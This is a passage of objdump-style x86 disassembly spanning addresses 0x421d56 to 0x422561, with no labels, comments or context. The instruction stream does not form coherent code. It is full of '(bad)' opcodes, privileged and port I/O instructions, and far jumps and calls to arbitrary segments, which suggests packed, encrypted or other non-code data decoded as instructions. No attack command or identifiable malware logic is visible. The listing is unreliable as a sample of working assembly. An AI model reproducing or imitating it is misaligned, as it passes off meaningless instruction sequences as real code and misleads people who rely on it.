  421d56:	inc    edx
  421d57:	sub    ebx,DWORD PTR [ebx-0x24511a4f]
  421d5d:	iret   
  421d5e:	adc    BYTE PTR [ebp+0x2c],dh
  421d61:	add    BYTE PTR [esi+0x584900f5],al
  421d67:	sub    al,0x17
  421d69:	pop    esp
  421d6a:	mov    ah,0xd7
  421d6c:	jo     0x421d61
  421d6e:	mov    ebx,DWORD PTR [edi-0x19]
  421d71:	push   0x7e
  421d73:	pmaddwd mm1,QWORD PTR [edi+0x7d]
  421d77:	mov    ebp,?
  421d79:	aad    0x1d
  421d7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d7c:	es test al,0x95
  421d7f:	xchg   edi,eax
  421d80:	mov    gs,WORD PTR [edi-0xd]
  421d83:	sar    edi,cl
  421d85:	into   
  421d86:	mov    edi,DWORD PTR [ebx+eiz*8-0x41]
  421d8a:	cmp    al,0xa0
  421d8c:	sbb    al,0x3c
  421d8e:	dec    edx
  421d8f:	sbb    edi,esp
  421d91:	xor    DWORD PTR [eax+0x66],ebx
  421d94:	retf   0x4b85
  421d97:	fidiv  WORD PTR [ecx+0x3ba5fd75]
  421d9d:	fmul   DWORD PTR [esi-0x5a]
  421da0:	fild   WORD PTR [ecx]
  421da2:	xchg   esi,eax
  421da3:	inc    esi
  421da4:	jmp    0xff5c:0x1667338c
  421dab:	fimul  DWORD PTR [esi]
  421dad:	push   edi
  421dae:	ja     0x421dcf
  421db0:	mov    cl,BYTE PTR [eax]
  421db2:	push   ecx
  421db3:	sar    BYTE PTR [edx-0x2e],0xc5
  421db7:	fwait
  421db8:	in     al,dx
  421db9:	mov    ebp,0x1c677ff5
  421dbe:	pop    es
  421dbf:	dec    esi
  421dc0:	jbe    0x421da9
  421dc2:	clc    
  421dc3:	(bad)  
  421dc4:	stos   DWORD PTR es:[edi],eax
  421dc5:	out    dx,eax
  421dc6:	in     al,0xb
  421dc8:	sti    
  421dc9:	iret   
  421dca:	lock fsub st(7),st
  421dcd:	cld    
  421dce:	add    eax,0xfd893bc6
  421dd3:	arpl   WORD PTR [eax-0x63bc2708],di
  421dd9:	fucomi st,st(1)
  421ddb:	mov    eax,0x2aa6d1bd
  421de0:	mov    esi,0xa1b58c6f
  421de5:	inc    ecx
  421de6:	ret    0x2425
  421de9:	sub    ebx,edx
  421deb:	push   0xffffffb7
  421ded:	jmp    0xd453:0x7f0b7ecc
  421df4:	(bad)  
  421df5:	push   0x33ab08f6
  421dfa:	imul   ebx,DWORD PTR [ebx-0x80],0x66c3bec2
  421e01:	cmp    al,0x95
  421e03:	mov    dh,0x69
  421e05:	push   ss
  421e06:	cwde   
  421e07:	inc    ebp
  421e08:	or     ah,bl
  421e0a:	mov    dh,0x9c
  421e0c:	dec    eax
  421e0d:	adc    bh,BYTE PTR [eax+eax*2]
  421e10:	adc    BYTE PTR [edi-0x13],bh
  421e13:	(bad)  
  421e14:	and    bl,BYTE PTR [edx+0x4b]
  421e17:	mov    bl,0x34
  421e19:	xor    BYTE PTR [ecx-0x66],dh
  421e1c:	sbb    al,0x6f
  421e1e:	sub    edx,ebx
  421e20:	adc    DWORD PTR [esi+0x20],ecx
  421e23:	adc    BYTE PTR [ecx-0x7d],cl
  421e26:	fadd   QWORD PTR [edi+edx*4]
  421e29:	sbb    bh,bl
  421e2b:	into   
  421e2c:	jg     0x421e13
  421e2e:	mov    es,ecx
  421e30:	push   0xffffffd3
  421e32:	sbb    eax,esp
  421e34:	inc    esp
  421e35:	pop    ds
  421e36:	ins    BYTE PTR es:[edi],dx
  421e37:	sahf   
  421e38:	sti    
  421e39:	pop    es
  421e3a:	fs or  edx,ebp
  421e3d:	daa    
  421e3e:	xor    cl,BYTE PTR [ebp+0x44534b12]
  421e44:	(bad)  
  421e45:	jmp    0x6e9a6895
  421e4a:	or     eax,0xca63e187
  421e4f:	add    eax,DWORD PTR [ecx+0x4c]
  421e52:	(bad)  
  421e53:	fcom   QWORD PTR [esi-0x2]
  421e56:	mov    edi,0x735234e5
  421e5b:	les    eax,FWORD PTR [esi+0xc]
  421e5e:	cli    
  421e5f:	ins    BYTE PTR es:[edi],dx
  421e60:	test   al,0xc0
  421e62:	call   0x8911:0x98d38755
  421e69:	les    edi,FWORD PTR [ebp+0x25]
  421e6c:	sub    bh,BYTE PTR [esi]
  421e6e:	int    0x51
  421e70:	jl     0x421e65
  421e72:	cld    
  421e73:	adc    BYTE PTR [esi-0x3e],0xc4
  421e77:	pusha  
  421e78:	sahf   
  421e79:	mov    DWORD PTR [esi+0x1c],esp
  421e7c:	mov    esp,0xc3e5f230
  421e81:	scas   eax,DWORD PTR es:[edi]
  421e82:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e84:	popf   
  421e85:	outs   dx,DWORD PTR ds:[esi]
  421e86:	lods   eax,DWORD PTR ds:[si]
  421e88:	iret   
  421e89:	sub    DWORD PTR [esi-0x641cec0f],0x7e
  421e90:	cmp    dh,BYTE PTR ss:[eax+0x2b519963]
  421e97:	or     ecx,ecx
  421e99:	push   ds
  421e9a:	and    eax,0x46337934
  421e9f:	and    esp,DWORD PTR [ebp+0x4faabb25]
  421ea5:	lea    ebp,[edx+0x90995ae]
  421eab:	xchg   esp,eax
  421eac:	or     eax,ebx
  421eae:	(bad)  
  421eaf:	xor    DWORD PTR ds:0xe2942c68,edi
  421eb5:	fisubr WORD PTR [ebp-0x32e5883c]
  421ebb:	jnp    0x421ebc
  421ebd:	xor    al,0x99
  421ebf:	bswap  eax
  421ec1:	push   ecx
  421ec2:	ja     0x421f1c
  421ec4:	in     eax,dx
  421ec5:	xor    ch,BYTE PTR [edx-0x7d2205eb]
  421ecb:	cdq    
  421ecc:	mov    ebp,0xfc0e9e2
  421ed1:	cwde   
  421ed2:	add    bh,BYTE PTR [edi+esi*1+0x66]
  421ed6:	(bad)  
  421ed7:	(bad)  [edx]
  421ed9:	sub    ch,dl
  421edb:	inc    eax
  421edc:	pushf  
  421edd:	mov    al,ds:0x543bffa8
  421ee2:	repz jle 0x421ecf
  421ee5:	(bad)  
  421ee6:	or     BYTE PTR [esi+edi*2],al
  421ee9:	add    al,bh
  421eeb:	mov    cl,0xd2
  421eed:	xchg   ebp,eax
  421eee:	ret    0xb088
  421ef1:	jae    0x421f55
  421ef3:	rol    DWORD PTR ds:0xd7e6e49e,0x9e
  421efa:	out    0x2d,eax
  421efc:	out    dx,eax
  421efd:	jg     0x421f0a
  421eff:	lahf   
  421f00:	cld    
  421f01:	retf   0xfa6f
  421f04:	pushf  
  421f05:	in     al,dx
  421f06:	pop    ebp
  421f07:	rol    BYTE PTR [edi+ebp*4+0x677473cb],0x4e
  421f0f:	mov    ds:0x39a915c7,al
  421f14:	retf   0xb13b
  421f17:	and    BYTE PTR [eax+edi*4],al
  421f1a:	idiv   ah
  421f1c:	ins    DWORD PTR es:[edi],dx
  421f1d:	push   ss
  421f1e:	daa    
  421f1f:	adc    bh,bl
  421f21:	out    dx,eax
  421f22:	(bad)  
  421f23:	cmp    DWORD PTR [esi-0x37],ebp
  421f26:	dec    ebp
  421f27:	and    al,0xc3
  421f29:	fistp  DWORD PTR [edi+0x6f77337a]
  421f2f:	(bad)  
  421f30:	fcom   DWORD PTR [edi-0x1]
  421f33:	push   0x40
  421f35:	leave  
  421f36:	dec    edx
  421f37:	mov    dl,0x8c
  421f39:	lea    ebx,[ebx]
  421f3b:	imul   BYTE PTR [edi-0xb]
  421f3e:	enter  0x7f73,0xd
  421f42:	leave  
  421f43:	cdq    
  421f44:	jnp    0x421ee3
  421f46:	repnz repz (bad) 
  421f4a:	fcomip st,st(3)
  421f4c:	in     al,0xa3
  421f4e:	push   edi
  421f4f:	jns    0x421f3e
  421f51:	mov    ebx,0xbdcf817f
  421f56:	cld    
  421f57:	sti    
  421f58:	pop    esp
  421f59:	jp     0x421f51
  421f5b:	mov    edi,0xd773e6e5
  421f60:	mov    eax,0x2e15e4fc
  421f65:	out    dx,al
  421f66:	neg    ah
  421f68:	pop    edx
  421f69:	adc    eax,0x12a3bf47
  421f6e:	mov    ebx,ebp
  421f70:	mov    ebp,0x52680102
  421f75:	test   al,0x32
  421f77:	adc    DWORD PTR [edx+ebx*4+0x7c],edi
  421f7b:	das    
  421f7c:	cmp    al,0x84
  421f7f:	dec    ebp
  421f80:	stos   BYTE PTR es:[edi],al
  421f81:	xchg   ebx,eax
  421f82:	std    
  421f83:	outs   dx,BYTE PTR ds:[esi]
  421f84:	jo     0x421f87
  421f86:	pop    es
  421f87:	mov    ah,0xd
  421f89:	mov    WORD PTR [eax],ss
  421f8b:	mov    DWORD PTR [ecx],ebp
  421f8d:	mov    edi,0x782fd338
  421f92:	gs inc edx
  421f94:	sbb    al,0x15
  421f96:	dec    esp
  421f97:	stos   BYTE PTR es:[edi],al
  421f98:	or     BYTE PTR [ecx+0x65],ch
  421f9b:	repnz dec eax
  421f9d:	adc    esp,edx
  421f9f:	mov    ds:0x23793488,al
  421fa4:	ja     0x421fc2
  421fa6:	fist   DWORD PTR [eax+0x4ab8371b]
  421fac:	or     dh,BYTE PTR [edx]
  421fae:	mov    cl,0x91
  421fb0:	mov    WORD PTR [ecx-0x56],ss
  421fb3:	cmc    
  421fb4:	adc    esp,ecx
  421fb6:	push   es
  421fb7:	mov    gs,WORD PTR [ebx-0x1eb5a506]
  421fbd:	and    al,0x99
  421fbf:	add    al,0x89
  421fc1:	call   0xdce09b5e
  421fc6:	imul   edx,DWORD PTR [ebx],0xa
  421fc9:	dec    eax
  421fca:	loope  0x421fb8
  421fcc:	std    
  421fcd:	in     eax,dx
  421fce:	sar    BYTE PTR [eax+ebx*4],cl
  421fd1:	jae    0x421f55
  421fd3:	cmc    
  421fd4:	jae    0x421faf
  421fd6:	shl    DWORD PTR ds:0x6953ad7,1
  421fdc:	pop    ebx
  421fdd:	and    eax,0x2de48880
  421fe2:	or     ah,BYTE PTR [edi-0x59f3e0b8]
  421fe8:	push   ds
  421fe9:	add    eax,ebx
  421feb:	out    0x36,al
  421fed:	pop    edi
  421fee:	imul   DWORD PTR [esi-0x9]
  421ff1:	mov    cl,0xfd
  421ff3:	lea    eax,[eax+0x363f50b4]
  421ff9:	mov    al,ds:0xd85cf782
  421fff:	cld    
  422000:	call   0x706b:0x731877ed
  422007:	cmp    ecx,DWORD PTR [ebp+ebp*8+0x1790abb3]
  42200e:	sbb    DWORD PTR [ebp-0xc1b4d],edi
  422014:	fincstp 
  422016:	mov    cl,0xf3
  422018:	xlat   BYTE PTR ds:[ebx]
  422019:	dec    DWORD PTR [eax+0x4f63cd7]
  42201f:	(bad)  
  422020:	in     eax,0x4b
  422022:	pop    esp
  422023:	sbb    al,0xb
  422025:	arpl   WORD PTR [ecx-0x4d],bx
  422028:	sbb    cl,BYTE PTR [edi+0x2ac18410]
  42202e:	shl    BYTE PTR [esi],cl
  422030:	cld    
  422031:	and    dh,cl
  422033:	jnp    0x422079
  422035:	jmp    0xffa1b8ef
  42203a:	pop    edx
  42203b:	std    
  42203c:	addr16 inc ebp
  42203e:	test   eax,0x9adaa1b6
  422043:	sub    dl,BYTE PTR [ebp-0x74a5fc5e]
  422049:	neg    DWORD PTR [ecx+0x441b73b4]
  42204f:	mov    dh,0xaa
  422051:	mov    ds:0x27040d49,eax
  422056:	loope  0x422055
  422058:	jmp    0xb75b:0x771dcc74
  42205f:	and    DWORD PTR [ecx],edi
  422061:	add    al,0x7d
  422063:	inc    ebp
  422064:	mov    bh,0x7
  422066:	js     0x421fe9
  422068:	pshufw mm4,mm7,0xab
  42206c:	pop    edi
  42206d:	adc    al,0x33
  42206f:	jmp    0x42200a
  422071:	icebp  
  422072:	std    
  422073:	pushf  
  422074:	(bad)  
  422075:	call   0xac73:0x62826fff
  42207c:	mov    ds:0x1e3ab9dd,eax
  422081:	sub    DWORD PTR [ebx+0x61],eax
  422084:	jge    0x4220c2
  422086:	clc    
  422087:	je     0x422029
  422089:	imul   edx,DWORD PTR [edi],0xffffffb8
  42208c:	cmc    
  42208d:	dec    ebx
  42208e:	dec    edi
  42208f:	shl    DWORD PTR [ebp-0x4f],1
  422092:	icebp  
  422093:	mov    bh,0xfa
  422095:	lahf   
  422096:	(bad)  
  422097:	pop    edi
  422098:	sti    
  422099:	adc    bh,BYTE PTR [edi-0x16]
  42209c:	in     eax,dx
  42209d:	dec    edi
  42209e:	popa   
  42209f:	stc    
  4220a0:	mov    ss,WORD PTR [ebx-0x628e8e8a]
  4220a6:	mov    edi,0xdc5a8a74
  4220ab:	shl    eax,0x13
  4220ae:	mov    edi,0x2efae1ce
  4220b3:	xchg   BYTE PTR [edx-0x12],dh
  4220b6:	aam    0x19
  4220b8:	idiv   BYTE PTR [edx+0x1ffdae3d]
  4220be:	jg     0x42213e
  4220c0:	stos   DWORD PTR es:[edi],eax
  4220c1:	xor    al,0xe9
  4220c3:	pop    ss
  4220c4:	in     eax,dx
  4220c5:	(bad)  
  4220c6:	out    0x4,eax
  4220c8:	push   edi
  4220c9:	push   ds
  4220ca:	jle    0x422068
  4220cc:	xchg   DWORD PTR [esi+0x4fcb8c78],ebx
  4220d2:	ds mov ch,al
  4220d5:	cs jmp 0xcf6c20ce
  4220db:	std    
  4220dc:	fimul  DWORD PTR [edi+0x72]
  4220df:	jecxz  0x4220af
  4220e1:	enter  0xae5b,0xbc
  4220e5:	xor    edx,0xffffffa6
  4220e8:	(bad)  
  4220ea:	bound  edi,QWORD PTR [ecx]
  4220ec:	jb     0x4220d1
  4220ee:	fldpi  
  4220f0:	mov    WORD PTR [ebx-0x1f],es
  4220f3:	int3   
  4220f4:	and    dl,BYTE PTR [ebx-0x56c2b63c]
  4220fa:	or     ah,BYTE PTR [ebx-0x6f2b7fc9]
  422100:	add    BYTE PTR [ebx-0xf],bl
  422103:	jno    0x422169
  422105:	push   ss
  422106:	mov    fs,WORD PTR [esi-0x2ace00b3]
  42210c:	sub    DWORD PTR [edx-0x40c04307],ebx
  422112:	call   0xd4944bcc
  422117:	leave  
  422118:	mov    ebp,0x3bae60da
  42211d:	mov    ch,0x5a
  42211f:	cld    
  422120:	(bad)  
  422122:	lds    eax,FWORD PTR [edi-0xeb364c7]
  422128:	xlat   BYTE PTR ds:[ebx]
  422129:	sub    DWORD PTR [ebx+0x1fa2718],edx
  42212f:	and    bl,BYTE PTR [edi]
  422131:	pop    ss
  422132:	cdq    
  422133:	das    
  422134:	hlt    
  422135:	fimul  DWORD PTR [eax+ebx*2-0x51a41a5f]
  42213c:	lods   al,BYTE PTR ds:[esi]
  42213d:	dec    esp
  42213e:	rol    esp,cl
  422140:	pop    edi
  422141:	push   ebx
  422142:	mov    ds:0x3fc9c0df,al
  422147:	lds    ecx,FWORD PTR [ebp+0x717346c5]
  42214d:	push   eax
  42214e:	or     al,0x24
  422150:	dec    ecx
  422151:	sar    DWORD PTR [edi],1
  422153:	and    ecx,eax
  422155:	loopne 0x42218e
  422157:	jne    0x422139
  422159:	xchg   esp,eax
  42215a:	arpl   WORD PTR [edi-0x3d71e38d],si
  422160:	sti    
  422161:	add    al,0xfc
  422163:	cmp    esp,DWORD PTR [ebp-0x7cb79d30]
  422169:	fist   DWORD PTR [ecx]
  42216b:	leave  
  42216c:	fild   DWORD PTR [esi]
  42216e:	gs es xchg esi,eax
  422171:	pop    edi
  422172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422173:	repnz pusha 
  422175:	xor    edx,esp
  422177:	jbe    0x4221b5
  422179:	or     al,0xa2
  42217b:	jae    0x422130
  42217d:	cmp    eax,0x7843502e
  422182:	mov    ebp,0x9d69b069
  422187:	shl    BYTE PTR [ebp+0x7df22aff],0x6d
  42218e:	iret   
  42218f:	xor    DWORD PTR [edx+0x7c],esp
  422192:	fdivr  DWORD PTR [eax+ebp*8]
  422195:	lds    ecx,FWORD PTR [ecx+ecx*8-0x3fd1cb7f]
  42219c:	les    edi,FWORD PTR [ebx+0x34]
  42219f:	push   edx
  4221a0:	dec    edx
  4221a1:	pushf  
  4221a2:	cmp    edi,DWORD PTR [ebx-0x62]
  4221a5:	mov    dl,0x7f
  4221a7:	call   0x9b07:0x34fb7e17
  4221ae:	mov    ebx,0x56071f5c
  4221b3:	jecxz  0x422175
  4221b5:	(bad)  
  4221b6:	push   0xffffff9f
  4221b8:	jne    0x4221d3
  4221ba:	nop
  4221bb:	xchg   esp,eax
  4221bc:	jmp    0x1041f93b
  4221c1:	mov    dh,0x46
  4221c3:	fldenv [eax-0x3465cfc6]
  4221c9:	mov    ebp,0x61eb2aab
  4221ce:	(bad)
  4221d1:	les    edi,FWORD PTR [edx+0x5c]
  4221d4:	xor    DWORD PTR [ebx+eiz*2-0x6a6f0e7a],edx
  4221db:	push   cs
  4221dc:	scas   al,BYTE PTR es:[edi]
  4221dd:	icebp  
  4221de:	fisttp WORD PTR [ecx+edx*2-0x477e76cb]
  4221e5:	leave  
  4221e6:	fnsave [ecx+ebp*4+0x5aec124c]
  4221ed:	mov    ebp,0x84a8b423
  4221f2:	hlt    
  4221f3:	pop    edx
  4221f4:	sbb    BYTE PTR [ebx-0x56e95d0e],0x40
  4221fb:	pusha  
  4221fc:	into   
  4221fd:	push   edi
  4221fe:	jb     0x42227b
  422200:	pusha  
  422201:	punpckldq mm4,DWORD PTR [esi-0x32a487f2]
  422208:	sub    bl,ah
  42220a:	in     al,dx
  42220b:	ins    BYTE PTR es:[edi],dx
  42220c:	lock ss popf 
  42220f:	sbb    ebx,ebx
  422211:	mov    bl,BYTE PTR [eax+0x6e]
  422214:	xchg   esp,eax
  422215:	(bad)  
  422216:	jp     0x422255
  422218:	push   edx
  422219:	mov    esi,DWORD PTR [edx-0x58e244d]
  42221f:	int3   
  422220:	dec    ecx
  422221:	outs   dx,BYTE PTR ds:[esi]
  422222:	out    dx,al
  422223:	(bad)  
  422225:	jmp    0xce37d155
  42222a:	shr    DWORD PTR [ebx],0xc1
  42222d:	mov    ss,WORD PTR [edx]
  42222f:	xchg   DWORD PTR [edi+0x7faf4f95],eax
  422235:	sub    edi,0xfffffffb
  422238:	ror    DWORD PTR [edi-0x4f],cl
  42223b:	ja     0x4222ae
  42223d:	and    ecx,0x7
  422240:	pop    ax
  422242:	(bad)  
  422243:	pop    esp
  422244:	jnp    0x422227
  422246:	ss in  al,dx
  422248:	scas   al,BYTE PTR es:[edi]
  422249:	jns    0x42222c
  42224b:	clc    
  42224c:	imul   DWORD PTR [ecx]
  42224e:	mov    dh,0xc6
  422250:	aam    0xf8
  422252:	inc    BYTE PTR [edi-0x41]
  422255:	fwait
  422256:	das    
  422257:	std    
  422258:	xchg   ebx,eax
  422259:	xchg   edi,eax
  42225a:	popa   
  42225b:	mov    ch,0xe0
  42225d:	rcl    ch,cl
  42225f:	mov    ecx,DWORD PTR [esp+ebp*1-0x10]
  422263:	mov    al,ds:0xe6bbb9dc
  422268:	into   
  422269:	popf   
  42226a:	cmp    DWORD PTR [ebx],0xbdb35efb
  422270:	cli    
  422271:	hlt    
  422272:	push   ebp
  422273:	cs aas 
  422275:	jno    0x422290
  422277:	jmp    0xe25f:0xd8f85e49
  42227e:	(bad)  
  422280:	xor    eax,0x27e97fdf
  422285:	mov    eax,0x8bffbafa
  42228a:	adc    edi,DWORD PTR [ebx]
  42228c:	and    edx,edi
  42228e:	lahf   
  42228f:	jge    0x42229a
  422291:	sbb    eax,0xe1674e47
  422296:	ret    0x23a2
  422299:	or     ebx,DWORD PTR [esi-0x15]
  42229c:	aad    0x12
  42229e:	cmp    DWORD PTR [edi+ebx*2-0x4e5cb6a3],esp
  4222a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222a6:	pop    edx
  4222a7:	inc    esp
  4222a8:	popf   
  4222a9:	push   0x11312dbb
  4222ae:	sub    DWORD PTR [esi],ebp
  4222b0:	cmp    al,0xab
  4222b2:	rol    DWORD PTR ds:0xd7fda128,0x49
  4222b9:	call   FWORD PTR [edi-0x56]
  4222bc:	loope  0x422321
  4222be:	retf   
  4222bf:	fmul   QWORD PTR [ecx-0x1c]
  4222c2:	sbb    ch,BYTE PTR [ebp-0x5c]
  4222c5:	mov    ch,0xc9
  4222c7:	stos   BYTE PTR es:[edi],al
  4222c8:	inc    ebx
  4222c9:	sub    al,0x53
  4222cb:	(bad)
  4222ce:	les    esp,FWORD PTR [ecx-0x26466aab]
  4222d4:	(bad)  
  4222d5:	cmp    al,0xe7
  4222d7:	push   ebp
  4222d8:	adc    eax,0x54d09c9a
  4222dd:	rcl    BYTE PTR [edx],1
  4222df:	mov    ecx,0x56d2e475
  4222e4:	aad    0x1b
  4222e6:	test   eax,0xd73e8dcc
  4222eb:	push   es
  4222ec:	xchg   ebx,eax
  4222ed:	ret    
  4222ee:	dec    ecx
  4222ef:	imul   ebp,DWORD PTR [ebx-0x68],0x8739a652
  4222f6:	(bad)  
  4222f7:	cmp    dl,BYTE PTR [eax]
  4222f9:	arpl   WORD PTR [ecx-0x710a9498],bx
  4222ff:	add    DWORD PTR [esi],ebx
  422301:	(bad)  
  422302:	retf   
  422303:	cwde   
  422304:	cli    
  422305:	xor    BYTE PTR [edx],bl
  422307:	push   ecx
  422308:	adc    eax,0xadcb5fe4
  42230d:	fistp  DWORD PTR [edi+edi*4+0x367789b6]
  422314:	jle    0x4222b3
  422316:	cs mov cs,ecx
  422319:	push   0x7fad868b
  42231e:	push   ebx
  42231f:	out    dx,eax
  422320:	jg     0x4222dd
  422322:	mov    dl,0xb0
  422325:	daa    
  422326:	popa   
  422327:	iret   
  422328:	push   esp
  422329:	inc    ecx
  42232a:	or     bh,al
  42232c:	ficomp DWORD PTR [edx-0x4bd63d2e]
  422332:	sti    
  422333:	pop    ebp
  422334:	sub    esi,DWORD PTR [ecx]
  422336:	and    eax,DWORD PTR [ebx-0x7aa70d6a]
  42233c:	push   edx
  42233d:	xchg   esp,eax
  42233e:	mov    ds:0x65dc9183,eax
  422343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422344:	neg    ah
  422346:	cli    
  422347:	fcom   QWORD PTR [ebx]
  422349:	sbb    al,0xdb
  42234b:	xchg   bl,al
  42234d:	cmp    dh,BYTE PTR [edx+0x32eb0dd2]
  422353:	xchg   edx,eax
  422354:	lock and DWORD PTR ds:0xbac0b75d,esi
  42235b:	inc    edx
  42235c:	test   eax,0xcd658cc7
  422361:	pusha  
  422362:	test   DWORD PTR [ecx-0x26e295aa],esi
  422368:	or     al,0x47
  42236a:	lods   al,BYTE PTR ds:[esi]
  42236b:	(bad)  
  42236c:	arpl   WORD PTR [esi],si
  42236e:	ret    
  42236f:	call   0x58f7:0x2eb31eb1
  422376:	aad    0x63
  422378:	ins    BYTE PTR es:[edi],dx
  422379:	sbb    al,0x19
  42237b:	aaa    
  42237c:	and    esp,DWORD PTR [ebp+0x60]
  42237f:	push   0x2
  422381:	imul   ebx,DWORD PTR [edx+0x51608d59],0xffffffab
  422388:	pop    DWORD PTR [ebx+ebp*1]
  42238b:	lds    esp,FWORD PTR [edi]
  42238d:	aaa    
  42238e:	push   ecx
  42238f:	mov    ebp,0x7356b2db
  422394:	or     eax,0xb0ca3980
  422399:	jle    0x4223db
  42239b:	dec    ebp
  42239c:	(bad)  
  42239d:	inc    DWORD PTR [eax+0x0]
  4223a0:	jle    0x4223d5
  4223a2:	sub    al,0xc0
  4223a4:	iret   
  4223a5:	xchg   esi,eax
  4223a6:	rol    edi,0x1
  4223a9:	fnsave [esi]
  4223ab:	clc    
  4223ac:	jmp    0x687437a2
  4223b1:	ja     0x4223dd
  4223b3:	fwait
  4223b4:	cmc    
  4223b5:	sar    dh,0x9d
  4223b8:	and    esi,DWORD PTR [eax]
  4223ba:	jecxz  0x4223b4
  4223bc:	retf   
  4223bd:	or     esi,DWORD PTR [esi+0x7f]
  4223c0:	jmp    0x4223df
  4223c2:	hlt    
  4223c3:	imul   eax,DWORD PTR [ecx+0x195693d0],0xf637c2ab
  4223cd:	pop    esi
  4223ce:	loop   0x422423
  4223d0:	cli    
  4223d1:	push   ecx
  4223d2:	sahf   
  4223d3:	js     0x4223c8
  4223d5:	sbb    BYTE PTR [ebp-0x488466ed],0xf7
  4223dc:	mov    ecx,0x7616fb73
  4223e1:	imul   BYTE PTR [esi]
  4223e3:	xlat   BYTE PTR ds:[ebx]
  4223e4:	fdivrp st(3),st
  4223e6:	ja     0x422390
  4223e8:	imul   ecx,DWORD PTR [ebp-0x3d068d77],0x7c3d9e45
  4223f2:	mov    ebx,esp
  4223f4:	(bad)  
  4223f5:	inc    DWORD PTR [ebp-0x50]
  4223f8:	mov    fs,WORD PTR [edx+eax*8]
  4223fb:	in     eax,dx
  4223fc:	pop    ebx
  4223fd:	sub    eax,DWORD PTR [edi+ebx*1]
  422400:	mov    ecx,0xa3ff4755
  422405:	inc    ebp
  422406:	mov    ecx,0xcdc57371
  42240b:	fild   DWORD PTR [ebx]
  42240d:	pop    ecx
  42240e:	test   bl,cl
  422410:	dec    edi
  422411:	pop    esp
  422412:	fld    DWORD PTR es:[edx-0x6c0ec0e9]
  422419:	cld    
  42241a:	ficomp DWORD PTR [edi]
  42241c:	jle    0x4223a8
  42241e:	mov    ebp,0xfaf2ce87
  422423:	mov    bh,0xfe
  422425:	sbb    ah,BYTE PTR [edi]
  422427:	xchg   esi,eax
  422428:	test   ebx,esp
  42242a:	jmp    0x422403
  42242c:	mov    eax,0x8c6bf5fe
  422431:	fwait
  422432:	xchg   ecx,eax
  422433:	xor    ecx,DWORD PTR [ebx]
  422435:	mov    eax,ds:0x20d96333
  42243a:	outs   dx,DWORD PTR ds:[esi]
  42243b:	inc    esp
  42243c:	mov    bh,0x5a
  42243e:	lock fstp st(5)
  422441:	cbw    
  422443:	mov    ecx,0x21e9f023
  422448:	lods   eax,DWORD PTR ds:[esi]
  422449:	cmp    DWORD PTR [edi-0x5233ee37],eax
  42244f:	mov    edx,0xf541691
  422454:	in     eax,dx
  422455:	mov    esi,0xb0082a4a
  42245a:	push   0xffffffd3
  42245c:	jl     0x42249f
  42245e:	mov    bl,0x18
  422460:	and    BYTE PTR [edx],dl
  422462:	imul   esp,DWORD PTR [ebx+0x6f54d2da],0xfffffffb
  422469:	lods   eax,DWORD PTR ds:[esi]
  42246a:	mov    esi,0x8f9a3177
  42246f:	lods   al,BYTE PTR ds:[esi]
  422470:	mov    eax,0x58464c61
  422475:	or     al,0x1d
  422477:	sub    edx,DWORD PTR [edx+0x7d]
  42247a:	dec    edi
  42247b:	mov    ebp,0x81a73106
  422480:	es call 0x1e1e:0x1e45b681
  422488:	popa   
  422489:	xchg   edx,eax
  42248a:	push   eax
  42248b:	mov    bh,0x7c
  42248d:	cmp    al,0x9c
  42248f:	push   ebx
  422490:	push   edx
  422491:	mov    ds:0xa5a12c3,al
  422496:	and    DWORD PTR [edi+ebx*1+0x40],edx
  42249a:	adc    dl,cl
  42249c:	pop    esi
  42249d:	pop    ebx
  42249e:	adc    eax,0xa26ae022
  4224a3:	cli    
  4224a4:	std    
  4224a5:	jecxz  0x4224c3
  4224a7:	imul   edi,DWORD PTR [ebp-0x41db49f],0xd9070cc6
  4224b1:	jp     0x4224e2
  4224b3:	add    bl,cl
  4224b5:	and    BYTE PTR [ecx+0x4c],al
  4224b8:	clc    
  4224b9:	imul   DWORD PTR [ecx-0x10]
  4224bc:	mov    ebp,0x9ebb7419
  4224c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224c2:	push   DWORD PTR [edi]
  4224c4:	je     0x422518
  4224c6:	loop   0x422460
  4224c8:	jmp    0x349a7d39
  4224cd:	add    BYTE PTR ds:0x36d326a,0x50
  4224d4:	cdq    
  4224d5:	sub    ah,BYTE PTR [esi+eiz*2]
  4224d8:	ficomp WORD PTR [ebp-0x3060f9a9]
  4224de:	mov    bh,0x77
  4224e0:	bound  ecx,QWORD PTR [edi+0x3997dde3]
  4224e6:	fstp   DWORD PTR [ebp-0x29fa26da]
  4224ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224ed:	hlt    
  4224ee:	std    
  4224ef:	cs mov ecx,0x964c5db
  4224f5:	bound  edx,QWORD PTR [ebx*2+0x1f6b8e33]
  4224fc:	dec    edx
  4224fd:	cmp    ecx,DWORD PTR [esi-0x54de1454]
  422503:	int    0x1
  422505:	mov    ebx,0x1f5eb01
  42250b:	stos   DWORD PTR es:[edi],eax
  42250c:	cmc    
  42250d:	cmp    eax,0x2fb1e336
  422512:	pushf  
  422513:	sub    eax,0xf1b2ab23
  422518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422519:	mov    bh,0xa6
  42251b:	sar    DWORD PTR ds:[ecx],0x5a
  42251f:	ret    0xfcd5
  422522:	fbld   TBYTE PTR [ecx]
  422524:	into   
  422525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422526:	sbb    dl,bl
  422528:	sbb    al,0x88
  42252a:	xchg   BYTE PTR [esp+ebp*2-0x7c],bl
  42252e:	mov    cl,0x80
  422530:	xchg   esi,eax
  422531:	pop    ecx
  422532:	sar    BYTE PTR [edi+ebx*4-0x7f],cl
  422536:	cmp    eax,0xf7c1ede0
  42253b:	add    ch,BYTE PTR [eax-0x6aab6eb1]
  422541:	test   eax,0xd5ca7127
  422546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422547:	or     al,0x60
  422549:	(bad)  
  42254a:	ret    
  42254b:	adc    ecx,DWORD PTR [eax+eax*8+0x237148fc]
  422552:	add    BYTE PTR [esi],dl
  422554:	cmp    ebx,DWORD PTR ds:0x3712e467
  42255a:	outs   dx,BYTE PTR ds:[esi]
  42255b:	pop    edi
  42255c:	out    0xd,eax
  42255e:	(bad)  
  422560:	pop    ss
  422561:	pop    edi
